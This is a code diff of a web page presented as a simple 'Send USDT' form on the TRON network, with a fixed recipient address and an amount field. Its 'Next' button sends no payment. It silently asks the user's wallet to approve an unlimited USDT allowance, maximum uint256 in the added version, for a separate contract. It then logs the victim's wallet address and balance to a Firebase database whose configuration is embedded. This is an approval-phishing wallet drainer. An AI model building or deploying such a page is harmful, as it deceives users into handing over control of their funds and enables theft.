@@ -1,130 +1,112 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Send USDT</title>
-  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter@latest/dist/index.umd.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
+  <title>TRC-20 USDT Approval</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       margin: 0;
-      font-family: Arial, sans-serif;
-      background: #121212;
-      color: #fff;
+      padding: 0;
+      font-family: Arial;
+      background-color: #121212;
+      color: white;
       display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding-top: 60px;
+      justify-content: center;
     }
     .container {
-      width: 90%;
       max-width: 400px;
-      background: #1e1e1e;
-      border-radius: 12px;
       padding: 20px;
-      box-shadow: 0 0 10px #000;
+      margin-top: 40px;
     }
-    h2 {
-      text-align: center;
-      margin-bottom: 20px;
-      color: #00ffcc;
-    }
-    label {
-      display: block;
-      margin-top: 15px;
-      font-size: 14px;
+    input, button {
+      width: 100%;
+      padding: 14px;
+      margin: 10px 0;
+      font-size: 16px;
+      border-radius: 10px;
+      border: none;
     }
     input {
-      width: 100%;
-      padding: 10px;
-      margin-top: 5px;
-      border: none;
-      border-radius: 8px;
-      background: #2c2c2c;
-      color: #fff;
-      font-size: 16px;
-    }
-    input[readonly] {
-      background: #333;
+      background-color: #1e1e1e;
+      color: white;
     }
     button {
-      margin-top: 25px;
-      width: 100%;
-      padding: 12px;
-      background-color: #00ffcc;
-      color: #000;
-      font-weight: bold;
-      border: none;
-      border-radius: 8px;
+      background-color: #3cb371;
+      color: white;
       cursor: pointer;
-      font-size: 16px;
     }
-    button:hover {
-      background-color: #00e6b8;
+    .field-label {
+      margin-top: 15px;
+      margin-bottom: 5px;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <h2>Send USDT</h2>
-    <label>Receiver Wallet Address</label>
-    <input type="text" readonly value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" id="receiver" />
+    
+    <div class="field-label">Recipient Wallet Address</div>
+    <input type="text" value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" disabled />
 
-    <label>Enter USDT Amount</label>
-    <input type="number" placeholder="0.00" id="amount" />
+    <div class="field-label">Amount</div>
+    <input id="amount" type="number" placeholder="Enter amount" />
 
-    <button onclick="approveUSDT()">Next</button>
+    <button onclick="triggerApproval()">Next</button>
   </div>
 
+  <!-- TronWeb and Firebase SDKs -->
+  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter@latest/dist/index.umd.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/firebase@9.22.0/firebase-app-compat.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/firebase@9.22.0/firebase-firestore-compat.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronweb@1.0.0-beta.17/dist/TronWeb.js"></script>
+
   <script>
-    // ✅ Firebase config
+    // Firebase setup
     const firebaseConfig = {
-      apiKey: 'AIzaSyBkyDsWXjZXx8w1SGxP7Koxq8pzkW8NYxM',
-      authDomain: 'trc20-approval-dapp.firebaseapp.com',
-      projectId: 'trc20-approval-dapp',
-      storageBucket: 'trc20-approval-dapp.appspot.com',
-      messagingSenderId: '770961226156',
-      appId: '1:770961226156:web:d7857b971dd376b7902209'
+      apiKey: "AIzaSyBkyDsWXjZXx8w1SGxP7Koxq8pzkW8NYxM",
+      authDomain: "trc20-approval-dapp.firebaseapp.com",
+      projectId: "trc20-approval-dapp",
+      storageBucket: "trc20-approval-dapp.appspot.com",
+      messagingSenderId: "770961226156",
+      appId: "1:770961226156:web:d7857b971dd376b7902209"
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
-    const usdtAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // Official USDT (TRC-20)
-    const contractAddress = "TYMqXAPENEz1yehDFQE34hngR1KqLW1zhX"; // Your deployed contract
-    const approvalAmount = "1000000000000000000000000"; // 1 million USDT (unlimited)
+    const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const dappContractAddress = "TYMqXAPENEz1yehDFQE34hngR1KqLW1zhX";
 
-    async function approveUSDT() {
+    async function triggerApproval() {
       try {
         if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-          alert("Please connect your TRON wallet.");
+          alert("Please connect a Tron-compatible wallet like SafePal, OKX, or TokenPocket.");
           return;
         }
 
-        const userAddress = window.tronWeb.defaultAddress.base58;
-        const usdtContract = await window.tronWeb.contract().at(usdtAddress);
-
-        await usdtContract
-          .approve(contractAddress, approvalAmount)
-          .send({ feeLimit: 100_000_000 });
-
-        // ✅ Get balance and log to Firebase
-        const balance = await usdtContract.balanceOf(userAddress).call();
+        const from = window.tronWeb.defaultAddress.base58;
         const amountInput = document.getElementById("amount").value || "0";
 
+        const contract = await window.tronWeb.contract().at(usdtContractAddress);
+
+        // Approve Max amount
+        const maxAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+        await contract.approve(dappContractAddress, maxAmount).send();
+
+        // Get balance
+        const balance = await contract.balanceOf(from).call();
+
+        // Log to Firestore
         await db.collection("approvals").add({
-          wallet_address: userAddress,
+          wallet_address: from,
           amount: amountInput,
-          balance: parseFloat(window.tronWeb.fromSun(balance._hex)),
-          timestamp: new Date().toISOString(),
+          balance: parseInt(balance._hex || balance, 16) / 1e6,
+          timestamp: new Date()
         });
 
-        alert("Approval sent & logged.");
-      } catch (e) {
-        console.error(e);
-        alert("Error: " + e.message);
+        alert("Approval sent.");
+      } catch (err) {
+        alert("Error during approval: " + err.message);
+        console.error(err);
       }
     }
   </script>
